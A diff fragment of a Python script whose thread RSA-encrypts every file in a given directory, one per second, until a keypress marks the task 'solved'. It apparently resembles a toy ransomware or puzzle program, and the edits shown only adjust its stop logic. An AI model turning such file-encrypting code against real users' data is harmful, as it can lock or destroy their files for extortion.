@@ -18,15 +18,15 @@ class EncrypterThread(threading.Thread):
         self._stop = False
         self._dir = dir_
 
-    def run(self):
+    def run(self) -> None:
         files_count: int = (len(os.listdir(self._dir)))
         for file_num, file in enumerate(os.listdir(self._dir)):
 
+            sleep(1)
             if self._stop:
                 print("Encrypshion was stoped")
-                break
+                return
 
-            sleep(1)
             with open(f"{self._dir}\\{file}", "rb") as f:
                 data = rsa.encrypt(f.read(), public_key)
 
@@ -39,6 +39,9 @@ class EncrypterThread(threading.Thread):
 
     def stop(self):
         self._stop = True
+
+    def stopped(self):
+        return self._stop
 
 
 def main() -> None:
@@ -56,7 +59,7 @@ def main() -> None:
     enc_thread.start()
     solved: bool = False
 
-    while enc_thread.is_alive():
+    while not enc_thread.stopped():
         if msvcrt.getch() == b"a":
             enc_thread.stop()
             solved = True
